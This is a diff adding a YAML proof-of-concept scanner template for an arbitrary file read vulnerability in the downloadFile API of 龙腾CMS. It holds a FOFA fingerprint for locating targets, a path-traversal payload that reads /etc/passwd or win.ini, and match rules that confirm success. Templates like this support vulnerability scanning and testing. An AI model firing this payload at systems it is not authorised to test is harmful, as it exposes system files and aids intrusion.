@@ -1,0 +1,19 @@
+id: poc-yaml-wanglongcn-ltcms-downloadfile-read-any
+info:
+  name: 龙腾CMS downloadFile任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 龙腾CMS
+  fofa: icon_hash="-803002403"
+variables:
+  r_data_linux: '../../../../../../../../../../../../../../../../../etc/passwd
+
+    c:/windows/win.ini'
+requests:
+- method: GET
+  path: /api/file/downloadFile?file={{.r_data_linux}}
+  expression: "status_code == 200 && (\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
+    \ \"root:.*:0:0:\")\n)\n"
+transport: http
